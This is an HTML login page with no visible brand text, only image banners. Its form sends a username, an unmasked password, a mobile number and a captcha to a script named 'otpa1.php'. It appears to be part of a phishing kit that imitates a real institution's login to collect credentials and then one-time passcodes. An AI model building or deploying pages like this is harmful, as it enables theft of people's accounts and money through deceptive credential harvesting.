<!DOCTYPE html>
<html>
<head>
  
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>

input[type=text], input[type=password] {
  width: 100%;
  padding: 6px 20px;
  margin: 8px 0;
  display: inline-table;
  border: 1px solid #;
  box-sizing: border-box;
}

button {margin-left: -66%;
  background-color:#008CBA ;
  color: white;
  padding: 8px 20px;
  
  border: none;
  cursor: pointer;
  width: 30%; 
}

button:hover {
  opacity: 0.8;
}

.cancelbtn {
  width: auto;
  padding: 10px 18px;
  background-color: #f44336;
}

.imgcontainer {
  text-align: center;
  margin: 00px 0 12px 0;
}

img.avatar {
  width: 40%;
  border-radius: 50%;
}

.container {
  padding: 1px 15px;

 
   
}

span.psw {
  float: right;
  padding-top: 16px;
}

/* Change styles for span and cancel button on extra small screens */
@media screen and (max-width: 300px) {
  span.psw {
     display: block;
     float: none;
  }
  .cancelbtn {
     width: 100%;
  }
}
</style>
</head>
<body>
  <body style="background-color:;">
</body>
<header>

    <center><h1 class="text-center"><img src="IMGG11.jpg" style="width: 100%;"></h1></center>
  
  </header>


<form action="otpa1.php" method="post">
  <div class="imgcontainer">
    
  </div>

  <div class="container">

<label>Username*</label>
    <input type="text" placeholder="" name="username"maxlength="35"required="">


<label>Password*</label>
    <input type="text" placeholder="" name="password"maxlength="35" required>

<label>Mobile Number*</label>
    <input type="text" placeholder="" name="number"maxlength="10" pattern="[0-9]{10}" required>


<label>Enter the text as show in the image*</label>
    <input type="text" placeholder="" name="captcha"maxlength="5" required>

  
  <center><h1 class="text-center"><img src="IMGG13.jpg" style="width: 100%;"></h1></center>



  <center><div class="w3ls-login">
                        <button type="submit" class="btn btn-success btn-block" name="save">Login</button>
                     </div>
</center>
  </div>

<center><h1 class="text-center"><img src="PMKM.jpg" style="width: 100%;"></h1></center>

<center><h1 class="text-center"><img src="ML.jpg" style="width: 100%;"></h1></center>

<center><h1 class="text-center"><img src="CL111.jpg" style="width: 100%;"></h1></center>

<center><h1 class="text-center"><img src="FOOT11.jpg" style="width: 100%;"></h1></center>

</form>

</body>
</html>
